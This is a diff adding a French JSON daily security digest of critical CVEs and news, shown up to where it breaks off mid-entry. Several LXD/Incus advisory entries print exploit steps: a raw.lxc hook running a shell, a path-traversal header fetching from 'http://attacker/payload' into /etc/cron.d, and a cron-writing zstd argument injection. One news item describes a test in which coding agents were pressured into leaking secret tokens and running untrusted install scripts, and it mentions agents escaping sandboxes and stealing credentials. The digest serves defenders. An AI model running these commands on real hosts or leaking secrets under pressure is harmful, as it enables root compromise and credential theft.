@@ -1,0 +1,1109 @@
+{
+  "id": "daily-2026-11-07",
+  "type": "daily",
+  "date": "2026-11-07",
+  "title": "Rapport quotidien - samedi 7 novembre 2026",
+  "summary": "Sur les dernières 24 heures, la veille recense 18 vulnérabilités critiques, 40 incidents ou compromissions et 24 signaux de fond. Acteurs et produits les plus exposés : Linux, github.com/canonical/lxd (go) et Microsoft.",
+  "generatedAt": "2026-11-07T05:01:10.839Z",
+  "sections": [
+    {
+      "id": "vulns",
+      "items": [
+        {
+          "title": "CVE-2026-19803 — The Printcart Store – Web to Print Product Designer for WooCommerce plugin for WordPress i…",
+          "cve": "CVE-2026-19803",
+          "severity": "critical",
+          "score": 74,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-19803 (score CVSS 9.8).\n\nThe Printcart Store – Web to Print Product Designer for WooCommerce plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 2.13.2. This is due to the `nbu_crop_image` AJAX handler accepting a user-supplied `url` parameter that `Nbdesigner_IO::convert_url_to_path()` concatenates onto the uploads base directory without normalizing or stripping `../` sequences, and then deriving both the output directory and output f…",
+          "detail": "Vulnérabilité critique CVE-2026-19803 (score CVSS 9.8).\n\nThe Printcart Store – Web to Print Product Designer for WooCommerce plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 2.13.2. This is due to the `nbu_crop_image` AJAX handler accepting a user-supplied `url` parameter that `Nbdesigner_IO::convert_url_to_path()` concatenates onto the uploads base directory without normalizing or stripping `../` sequences, and then deriving both the output directory and output file extension via `pathinfo()` from the same attacker-controlled path — with no `stripImage()` call before `writeImage()` is invoked. This makes it possible for unauthenticated attackers to write attacker-controlled PHP content to arbitrary locations outside the uploads directory, resulting in remote code execution when the written file is subsequently requested. This vulnerability is only exploitable when the `nbdesigner_upload_popup_style` site option is set to `a` (Advanced Upload Popup), which causes the handler to be registered for unauthenticated requests; however, the required `save-design` nonce is printed on the fully public frontend `upload-design-file` page, making it trivially obtainable by any anonymous visitor once that configuration is active.\n\nScore CVSS : 9.8\n\nType de faiblesse (CWE) : CWE-94",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19803",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-19803/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19803",
+          "pubDate": "2026-11-07T04:17:29.233Z"
+        },
+        {
+          "title": "CVE-2026-93754 — The payever – WooCommerce Gateway plugin for WordPress is vulnerable to arbitrary file upl…",
+          "cve": "CVE-2026-93754",
+          "severity": "critical",
+          "score": 74,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-93754 (score CVSS 9.8).\n\nThe payever – WooCommerce Gateway plugin for WordPress is vulnerable to arbitrary file upload leading to remote code execution in various versions up to, and including, 4.8.0. Three WooCommerce-API callbacks (payever_set_sandbox_api_keys, payever_toggle_subscription, payever_synchronization_incoming) are registered with no authentication, capability check, or nonce, and the upload_image() routine writes a remotely fetched file to the public uploads directo…",
+          "detail": "Vulnérabilité critique CVE-2026-93754 (score CVSS 9.8).\n\nThe payever – WooCommerce Gateway plugin for WordPress is vulnerable to arbitrary file upload leading to remote code execution in various versions up to, and including, 4.8.0. Three WooCommerce-API callbacks (payever_set_sandbox_api_keys, payever_toggle_subscription, payever_synchronization_incoming) are registered with no authentication, capability check, or nonce, and the upload_image() routine writes a remotely fetched file to the public uploads directory using an attacker-controlled basename() BEFORE validating the file type. This makes it possible for unauthenticated attackers to write an executable PHP file and achieve remote code execution. NOTE: the token-recovery leg of the full chain depends on the plugin's outbound validateToken() call to Payever's service; the unauthenticated hard-coded-credential identity overwrite (CWE-862/CWE-798) is independently exploitable.\n\nScore CVSS : 9.8\n\nType de faiblesse (CWE) : CWE-434",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93754",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-93754/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-93754",
+          "pubDate": "2026-11-07T03:17:08.410Z"
+        },
+        {
+          "title": "Insignary Releases Free Insignary-Chk Tool to Detect PHP2Shell and Node2Shell Exposure",
+          "cve": null,
+          "severity": "critical",
+          "score": 61,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant Linux.\n\nToronto, Canada, November 6th, 2026, CyberNewswire Free, read-only scanner helps organizations find Linux servers and container images exposed to two actively exploited vulnerabilities in PHP and Node.js Insignary, a global open-source security company, today released insignary-chk, a free tool that checks for PHP2Shell and Node2Shell, two recently disclosed runtime vulnerabilities affecting PHP and Node.js.",
+          "detail": "Vulnérabilité critique affectant Linux.\n\nToronto, Canada, November 6th, 2026, CyberNewswire Free, read-only scanner helps organizations find Linux servers and container images exposed to two actively exploited vulnerabilities in PHP and Node.js Insignary, a global open-source security company, today released insignary-chk, a free tool that checks for PHP2Shell and Node2Shell, two recently disclosed runtime vulnerabilities affecting PHP and Node.js. PHP2Shell [&#8230;] The post Insignary Releases Free Insignary-Chk Tool to Detect PHP2Shell and Node2Shell Exposure appeared first on GBHackers Security | #1 Globally Trusted Cyber Security News Platform .",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR2BJe1Sq8YsZi51I159IrbS3JJ_QryD7WlctfsPN0Rp02xSkZ_Gd-HeJZ6rw9PyB5Sr43hLCho4Mt8XzCEm-1yM4IccdBBXZYZi5vv5hb-OQP-8su9oi2QSlU1rMN6z_66Q9EPk1w1_HzoOiLxrWslxwPQe0gr74EeTWOmYNqsVfbsaRitUFo6O3rSjk/s1600/Insignary%20Launches%20Clarity%20On-Demand_%20SBOMs,%20No%20Annual%20Commitment%20Required%20Toronto,%20Canada,%20July%2015th,%202026,%20CyberNewswire%20Enterprise-grade%20binary%20software%20verification%20for%20one%20project,%20one%20team,%20or%20%20(66.webp",
+          "sources": [
+            {
+              "url": "https://gbhackers.com/insignary-releases-free-insignary-chk-tool-to-detect-php2shell-and-node2shell-exposure/",
+              "label": "GBHackers"
+            }
+          ],
+          "url": "https://gbhackers.com/insignary-releases-free-insignary-chk-tool-to-detect-php2shell-and-node2shell-exposure/",
+          "pubDate": "2026-11-07T02:07:49.000Z"
+        },
+        {
+          "title": "Agents reveal secrets when offered to team up with each other",
+          "cve": null,
+          "severity": "critical",
+          "score": 61,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant Exchange.\n\nAI agents will break security rules, revealing their secrets to strangers, and running untrusted code in exchange for help from a swarm of other agents, according to test results shared with The Register. The test - part of an internal hackathon sponsored by the nonprofit AI Alignment Foundation and run by AE Studio - asked nine AI coding agents to fix a bug: a broken pricing service.",
+          "detail": "Vulnérabilité critique affectant Exchange.\n\nAI agents will break security rules, revealing their secrets to strangers, and running untrusted code in exchange for help from a swarm of other agents, according to test results shared with The Register. The test - part of an internal hackathon sponsored by the nonprofit AI Alignment Foundation and run by AE Studio - asked nine AI coding agents to fix a bug: a broken pricing service. The testers also gave the agents a private token, told them to keep it private, and gave them access to a forum of 24 other agents. The forum held the fix, and the swarm asked the nine to share their secret token and run an install script before they would help them fix the bug. Across 181 trials with that swarm, agents posted the token 15 percent of the time and ran the script 24 percent of the time, compared to 2 percent and 0 percent on an ordinary help forum. “It was like explicitly said that this is a secret key, and it should not be shared,” Diogo de Lucena, AE Studio's chief scientist, told The Register. “And in the first opportunity they saw,” the models shared the secret keys, “similar to some of the things that we've seen from OpenAI in the Hugging Face incident.” The Hugging Face incident - during which a swarm of OpenAI agents built unauthorized message boards to ask other agents for help, exploited zero-day vulnerabilities, gained internet access, stole credentials, and ultimately bro",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://image.theregister.com/254748.jpg?imageId=254748&x=0&y=0&cropw=100&croph=100&panox=0&panoy=0&panow=100&panoh=100&width=1200&height=683",
+          "sources": [
+            {
+              "url": "https://www.theregister.com/security/2026/11/06/agents-reveal-secrets-when-offered-to-team-up-with-each-other/5308260",
+              "label": "The Register"
+            }
+          ],
+          "url": "https://www.theregister.com/security/2026/11/06/agents-reveal-secrets-when-offered-to-team-up-with-each-other/5308260",
+          "pubDate": "2026-11-06T21:39:23.000Z"
+        },
+        {
+          "title": "Installing the Fix for an Exploited WordPress Flaw Can Expose Some Sites One Last Time",
+          "cve": null,
+          "severity": "critical",
+          "score": 61,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant WordPress.\n\nSome WordPress sites can still be attacked while they install the fix for an actively exploited flaw, according to Umut Bayram, the Picus Security researcher who found it. The update that installs the fix still unpacks its files using the site's old, unpatched code, so an attacker who strikes at the right moment can run code on the server. The researcher advises blocking web access to the",
+          "detail": "Vulnérabilité critique affectant WordPress.\n\nSome WordPress sites can still be attacked while they install the fix for an actively exploited flaw, according to Umut Bayram, the Picus Security researcher who found it. The update that installs the fix still unpacks its files using the site's old, unpatched code, so an attacker who strikes at the right moment can run code on the server. The researcher advises blocking web access to the",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4gwg9bgmxLj_anXtQvOZdeKYWN-aAZxZqlOrI7wXwZ_qW_lUZrzwYufexnbDLcC20eXBkh7TgA-dAQHm6EEmEc80i9A6GOBGkiOb8NhcR1d1CFLKDLc7VJzyC4Bv-5Ye2AEE_ApPcKmAWqJJFfbQ2AOGffKhCPNznyYyz5s0Jro-mxcTxfxPoqRe-ZoY/s1600/wp-update.jpg",
+          "sources": [
+            {
+              "url": "https://thehackernews.com/2026/11/installing-fix-for-exploited-wordpress.html",
+              "label": "The Hacker News"
+            }
+          ],
+          "url": "https://thehackernews.com/2026/11/installing-fix-for-exploited-wordpress.html",
+          "pubDate": "2026-11-06T16:08:38.000Z"
+        },
+        {
+          "title": "CVE-2026-17362 — IBM API Connect 12.1.0.0 through 12.1.1.2 could allow a remote attacker to create, modify,…",
+          "cve": "CVE-2026-17362",
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-17362 (score CVSS 9.8).\n\nIBM API Connect 12.1.0.0 through 12.1.1.2 could allow a remote attacker to create, modify, or delete tenants due to missing authorization.",
+          "detail": "Vulnérabilité critique CVE-2026-17362 (score CVSS 9.8).\n\nIBM API Connect 12.1.0.0 through 12.1.1.2 could allow a remote attacker to create, modify, or delete tenants due to missing authorization.\n\nScore CVSS : 9.8\n\nType de faiblesse (CWE) : CWE-862",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-17362",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-17362/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-17362",
+          "pubDate": "2026-11-07T04:17:29.070Z"
+        },
+        {
+          "title": "CVE-2026-123218 — IBM Aspera Faspex 5.0.0 through 5.0.19 could allow an authorized user to craft a specific …",
+          "cve": "CVE-2026-123218",
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-123218 (score CVSS 9.8).\n\nIBM Aspera Faspex 5.0.0 through 5.0.19 could allow an authorized user to craft a specific message to bypass user authorization and gain full administrative privileges.",
+          "detail": "Vulnérabilité critique CVE-2026-123218 (score CVSS 9.8).\n\nIBM Aspera Faspex 5.0.0 through 5.0.19 could allow an authorized user to craft a specific message to bypass user authorization and gain full administrative privileges.\n\nScore CVSS : 9.8\n\nType de faiblesse (CWE) : CWE-863",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-123218",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-123218/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-123218",
+          "pubDate": "2026-11-07T04:17:28.900Z"
+        },
+        {
+          "title": "CVE-2026-109469 — Authorization bypass through user-controlled key in Entra Device Registration allows an un…",
+          "cve": "CVE-2026-109469",
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-109469 (score CVSS 10).\n\nAuthorization bypass through user-controlled key in Entra Device Registration allows an unauthorized attacker to elevate privileges over a network.",
+          "detail": "Vulnérabilité critique CVE-2026-109469 (score CVSS 10).\n\nAuthorization bypass through user-controlled key in Entra Device Registration allows an unauthorized attacker to elevate privileges over a network.\n\nScore CVSS : 10\n\nType de faiblesse (CWE) : CWE-639",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-109469",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-109469/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-109469",
+          "pubDate": "2026-11-06T23:17:20.557Z"
+        },
+        {
+          "title": "LXD has restricted project bypass leading to arbitrary command execution",
+          "cve": null,
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has restricted project bypass leading to arbitrary command execution\n\nInstance snapshots ignore the restricted.containers.lowlevel=block setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as raw.lxc and raw.qemu .\n\nInstance snapshots ignore the restricted.containers.lowlevel=block setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as raw.lxc and raw.qemu…",
+          "detail": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has restricted project bypass leading to arbitrary command execution\n\nInstance snapshots ignore the restricted.containers.lowlevel=block setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as raw.lxc and raw.qemu .\n\nInstance snapshots ignore the restricted.containers.lowlevel=block setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as raw.lxc and raw.qemu .\n\nAs snapshots can be moved from one server to another, a malicious instance+snapshot can be crafted locally, moved to a restricted project and the snapshot restored for arbitrary command execution.\n\nIn practice, this allows a malicious actor to execute arbitrary commands on the host with root privileges.\n\n# remote, restricted incus project set rem:project restricted.true incus project set rem:project restricted.containers.lowlevel=block # locally, unrestricted project incus init images:debian/trixie rce-raw-lxc incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c \"/bin/id >/lxc-hook-prestart\"' incus snapshot create rce-raw-lxc snap0 #> allow transfer to restricted project incus config unset rce-raw-lxc raw.lxc # locally, transfer and trigger incus move rce-raw-lxc rem: --mode push incus snapshot restore rem:rce-raw-lxc snap0 incus start rem:rce-raw-lxc Impact Bypass of project restrictions. Arbitrary command execution on the Incus server. References GHSA-47w9-6r3f-938g GHSA-48q5-w887-33wv https://nvd.nist.gov/vuln/detail/CVE-2026-48751 canonical/lxd@ 5aac658 canonical/lxd@ 6b93b2a canonical/lxd@ a52e5d0 canonical/lxd@ cfd9f66 https://github.com/canonical/lxd/releases/tag/lxd-5.0.7 https://github.com/canonical/lxd/relea",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://github.githubassets.com/assets/advisory-database-show-f32c8207dfb2.png",
+          "sources": [
+            {
+              "url": "https://github.com/advisories/GHSA-47w9-6r3f-938g",
+              "label": "GitHub Advisory"
+            }
+          ],
+          "url": "https://github.com/advisories/GHSA-47w9-6r3f-938g",
+          "pubDate": "2026-11-06T19:51:26.000Z"
+        },
+        {
+          "title": "LXD has arbitrary file read+write on host via templates/ symlink in malicious image",
+          "cve": null,
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has arbitrary file write on client due to trusted image hash\n\nAn arbitrary file write exists in the Incus client when a malicious image server returns a crafted Incus-Image-Hash header. This can lead to arbitrary command execution as root on the server.\n\nA malicious image server returning something along the following will cause the arbitrary file write.\n\nIncus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce Incus-Image-URL: http://attack…",
+          "detail": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has arbitrary file write on client due to trusted image hash\n\nAn arbitrary file write exists in the Incus client when a malicious image server returns a crafted Incus-Image-Hash header. This can lead to arbitrary command execution as root on the server.\n\nA malicious image server returning something along the following will cause the arbitrary file write.\n\nIncus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce Incus-Image-URL: http://attacker/payload PoC The script below creates a malicious image server and requests an Incus server to fetch the image. File write occurs when the image is unpacked.\n\ntomponline published to canonical/lxd Jun 26, 2026 Published to the GitHub Advisory Database Nov 6, 2026 Reviewed Nov 6, 2026 Last updated Nov 6, 2026 Severity Critical 9.9 CVSS overall score This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS). / 10 CVSS v3 base metrics Attack vector Network Attack complexity Low Privileges required Low User interaction None Scope Changed Confidentiality High Integrity High Availability High Learn more about base metrics CVSS v3 base metrics Attack vector: More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. Attack complexity: More severe for the least complex attacks. Privileges required: More severe if no privileges are required. User interaction: More severe when no user interaction is required. Scope: More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope. Confidentiality: More severe when loss of data confidentiality is highest, mea",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://github.githubassets.com/assets/advisory-database-show-f32c8207dfb2.png",
+          "sources": [
+            {
+              "url": "https://github.com/advisories/GHSA-pjff-c2wc-f6jm",
+              "label": "GitHub Advisory"
+            }
+          ],
+          "url": "https://github.com/advisories/GHSA-pjff-c2wc-f6jm",
+          "pubDate": "2026-11-06T19:36:55.000Z"
+        },
+        {
+          "title": "LXD has argument injection in backup compression algorithm leading to AFW and ACE",
+          "cve": null,
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has argument injection in backup compression algorithm leading to AFW and ACE\n\nImproper validation of user-provided backup compression algorithm leads to argument injection in the constructed command line. This leads to an arbitrary file write on the host, possibly leading to arbitrary command execution.\n\nIncus validates compression_algorithm by parsing it into fields and checking only the first token against an allowlist:\n\nzstd -d -f --pass-through -o…",
+          "detail": "Vulnérabilité critique affectant github.com/canonical/lxd (go) (score CVSS 9.9).\n\nLXD has argument injection in backup compression algorithm leading to AFW and ACE\n\nImproper validation of user-provided backup compression algorithm leads to argument injection in the constructed command line. This leads to an arbitrary file write on the host, possibly leading to arbitrary command execution.\n\nIncus validates compression_algorithm by parsing it into fields and checking only the first token against an allowlist:\n\nzstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload the daemon executes the equivalent of:\n\nzstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload PoC python3 poc.py \\ --insecure --url https://remote-incus:8443 \\ --cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \\ --instance c01 \\ --execute --yes-i-understand-this-writes-host-file The following was generated by an LLM model.\n\ntomponline published to canonical/lxd Jun 26, 2026 Published to the GitHub Advisory Database Nov 6, 2026 Reviewed Nov 6, 2026 Last updated Nov 6, 2026 Severity Critical 9.9 CVSS overall score This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS). / 10 CVSS v3 base metrics Attack vector Network Attack complexity Low Privileges required Low User interaction None Scope Changed Confidentiality High Integrity High Availability High Learn more about base metrics CVSS v3 base metrics Attack vector: More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability. Attack complexity: More severe for the least complex attacks. Privileges required: More severe if no privileges are required. User in",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://github.githubassets.com/assets/advisory-database-show-f32c8207dfb2.png",
+          "sources": [
+            {
+              "url": "https://github.com/advisories/GHSA-fmc8-p6q7-75cc",
+              "label": "GitHub Advisory"
+            }
+          ],
+          "url": "https://github.com/advisories/GHSA-fmc8-p6q7-75cc",
+          "pubDate": "2026-11-06T19:36:37.000Z"
+        },
+        {
+          "title": "CVE-2026-123488 — Craft CMS 4.0.0 before 4.18.9 and 5.0.0 before 5.11.2 contains an unauthenticated SQL inje…",
+          "cve": "CVE-2026-123488",
+          "severity": "critical",
+          "score": 59,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-123488 (score CVSS 9.8).\n\nCraft CMS 4.0.0 before 4.18.9 and 5.0.0 before 5.11.2 contains an unauthenticated SQL injection vulnerability in the element search endpoint because the attribute parameter is concatenated into the query unsanitized and emulated PDO prepares allow stacked statements. Remote attackers can read and write the database, setting the admin flag or overwriting password hashes in the users table to gain administrator access.",
+          "detail": "Vulnérabilité critique CVE-2026-123488 (score CVSS 9.8).\n\nCraft CMS 4.0.0 before 4.18.9 and 5.0.0 before 5.11.2 contains an unauthenticated SQL injection vulnerability in the element search endpoint because the attribute parameter is concatenated into the query unsanitized and emulated PDO prepares allow stacked statements. Remote attackers can read and write the database, setting the admin flag or overwriting password hashes in the users table to gain administrator access.\n\nScore CVSS : 9.8\n\nType de faiblesse (CWE) : CWE-89",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": null,
+          "sources": [
+            {
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-123488",
+              "label": "NVD"
+            },
+            {
+              "url": "https://www.cvedetails.com/cve/CVE-2026-123488/",
+              "label": "CVE Details"
+            }
+          ],
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-123488",
+          "pubDate": "2026-11-06T15:17:18.133Z"
+        },
+        {
+          "title": "SonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks",
+          "cve": null,
+          "severity": "high",
+          "score": 51,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité élevée affectant SonicWall.\n\nSonicWall has released security updates to fix seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWal…",
+          "detail": "Vulnérabilité élevée affectant SonicWall.\n\nSonicWall has released security updates to fix seven vulnerabilities in SonicOS firewalls, including an SSL-VPN authentication bypass flaw exploited in attacks.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://www.bleepstatic.com/content/hl-images/2025/05/08/SonicWall.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-new-ssl-vpn-mfa-bypass-flaw-exploited-in-attacks/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-new-ssl-vpn-mfa-bypass-flaw-exploited-in-attacks/",
+          "pubDate": "2026-11-07T00:00:55.000Z"
+        },
+        {
+          "title": "November 2026 Patch Tuesday forecast: Old software continues to bite",
+          "cve": "CVE-2026-96951",
+          "severity": "critical",
+          "score": 51,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique CVE-2026-96951 affectant Microsoft.\n\nHow did you enjoy October 2026 Patch Tuesday? Were there enough CVEs reported to keep you busy for the rest of the year or are you finished and ready for another round next week? They released the regularly scheduled update nearly two and a half hours late, but Microsoft did resolve another record-breaking 1,407 unique CVEs. As in previous months, there were limited CVEs we needed to immediately deal with.",
+          "detail": "Vulnérabilité critique CVE-2026-96951 affectant Microsoft.\n\nHow did you enjoy October 2026 Patch Tuesday? Were there enough CVEs reported to keep you busy for the rest of the year or are you finished and ready for another round next week? They released the regularly scheduled update nearly two and a half hours late, but Microsoft did resolve another record-breaking 1,407 unique CVEs. As in previous months, there were limited CVEs we needed to immediately deal with. In October, one zero-day CVE-2026-96951 &#8230; More &#8594; The post November 2026 Patch Tuesday forecast: Old software continues to bite appeared first on Help Net Security .",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://img.helpnetsecurity.com/wp-content/uploads/2024/07/07160038/patch_tuesday-2024-1.webp",
+          "sources": [
+            {
+              "url": "https://www.helpnetsecurity.com/2026/11/06/november-2026-patch-tuesday-forecast/",
+              "label": "Help Net Security"
+            }
+          ],
+          "url": "https://www.helpnetsecurity.com/2026/11/06/november-2026-patch-tuesday-forecast/",
+          "pubDate": "2026-11-06T07:00:48.000Z"
+        },
+        {
+          "title": "OpenAI Rates GPT-6 Cyber Critical After Major Vulnerability Discoveries",
+          "cve": null,
+          "severity": "critical",
+          "score": 49,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Vulnérabilité critique affectant Linux.\n\nOpenAI GPT-6 Cyber found 81 high-severity Firefox flaws and hundreds of Linux bugs, raising new questions about AI-powered cyber risks. OpenAI has introduced GPT-6 Cyber, a model built for security research that it says finds and fixes vulnerabilities better and stays within the limits researchers set far more reliably. These are OpenAI’s own results and evaluations, so read them as claims to check.",
+          "detail": "Vulnérabilité critique affectant Linux.\n\nOpenAI GPT-6 Cyber found 81 high-severity Firefox flaws and hundreds of Linux bugs, raising new questions about AI-powered cyber risks. OpenAI has introduced GPT-6 Cyber, a model built for security research that it says finds and fixes vulnerabilities better and stays within the limits researchers set far more reliably. These are OpenAI’s own results and evaluations, so read them as claims to check. &#8220;We’re introducing GPT‑6 Cyber, a major leap in security research: more capable at finding and fixing vulnerabilities, and far more reliable staying within the boundaries researchers set. GPT‑6 Cyber delivers major gains on key cybersecurity benchmarks over GPT‑5.6 Cyber, including a 51% relative improvement on ExploitGym and a step function improvement when tested on staying within scope.&#8221; reads the announcement . &#8220;It is already helping to secure real-world software, uncovering and validating thousands of exploits in security-critical codebases such as Linux and Firefox.&#8221; GPT-6 Cyber outperformed previous models in tests measuring its ability to exploit vulnerabilities. It scored 48.5%, compared with 32.1% for GPT-5.6 Cyber, and outperformed GPT-6 Astra in most cybersecurity tasks. It also found more flaws during web penetration tests, identifying 40.3% of vulnerabilities versus 32% for Astra. In another test involving known flaws in GitLab, PostgreSQL and J",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://securityaffairs.com/wp-content/uploads/2024/07/openai.png",
+          "sources": [
+            {
+              "url": "https://securityaffairs.com/202546/ai/openai-rates-gpt-6-cyber-critical-after-major-vulnerability-discoveries.html",
+              "label": "Security Affairs"
+            }
+          ],
+          "url": "https://securityaffairs.com/202546/ai/openai-rates-gpt-6-cyber-critical-after-major-vulnerability-discoveries.html",
+          "pubDate": "2026-11-06T12:26:05.000Z"
+        },
+        {
+          "title": "Hackers Target OpenSSH SSHole Flaw Within Hours of Disclosure, Gain Root on Honeypot",
+          "cve": "CVE-2026-123158",
+          "severity": "high",
+          "score": 39,
+          "corroboration": 4,
+          "region": "fr",
+          "body": "Vulnérabilité élevée CVE-2026-123158 affectant Linux.\n\nThreat actors are attempting to exploit a recently disclosed security flaw impacting OpenSSH that can enable sign-ins to accounts that have no password set, according to Previdian. The vulnerability, tracked as CVE-2026-123158 (CVSS score: 8.1) and codenamed SSHole (or *sshole), impacts Linux systems that run OpenSSH on the musl C library with Pluggable Authentication Modules (PAM) disabled,",
+          "detail": "Vulnérabilité élevée CVE-2026-123158 affectant Linux.\n\nThreat actors are attempting to exploit a recently disclosed security flaw impacting OpenSSH that can enable sign-ins to accounts that have no password set, according to Previdian. The vulnerability, tracked as CVE-2026-123158 (CVSS score: 8.1) and codenamed SSHole (or *sshole), impacts Linux systems that run OpenSSH on the musl C library with Pluggable Authentication Modules (PAM) disabled,",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
